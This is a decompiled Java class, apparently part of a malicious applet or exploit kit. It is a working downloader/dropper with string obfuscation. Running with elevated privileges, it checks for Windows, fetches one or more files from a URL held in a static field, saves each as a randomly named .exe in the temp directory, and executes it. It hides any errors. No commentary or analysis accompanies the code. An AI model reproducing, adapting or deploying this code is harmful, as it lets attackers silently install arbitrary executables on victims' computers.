// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Nuytqwecuem implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        final int n = 2;
        final int n2 = 16;
        final byte[] array = new byte[s.length() / n];
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
        }
        return array;
    }
    
    public Object run() throws Exception {
        if (Nuytqwecuem.data == null) {
            return null;
        }
        try {
            final String property = System.getProperty("vvvvovvsvv.vvvnvavmvvvvev".replace("v", ""));
            final double n = Runtime.getRuntime().totalMemory();
            if (property.indexOf("zWzzzzizznzzzzdozwszz".replace("z", "")) >= 0) {
                int int1 = 1;
                if (Nuytqwecuem.cc != null) {
                    int1 = Integer.parseInt(Nuytqwecuem.cc);
                }
                final int n2 = 1024;
                for (int i = 0; i < int1; ++i) {
                    final URL url = new URL(Nuytqwecuem.data + Integer.toString(i));
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string = System.getProperty("gggggjgggaggvgggggag.igoggg.tggmgggpdggigr".replace("g", "")) + File.separator + Math.random() + ".yyeyxey".replace("y", "");
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    int n3 = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n3;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    if (n3 >= n2) {
                        Runtime.getRuntime().exec(string);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public Nuytqwecuem() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        Nuytqwecuem.data = null;
        Nuytqwecuem.cc = null;
    }
}
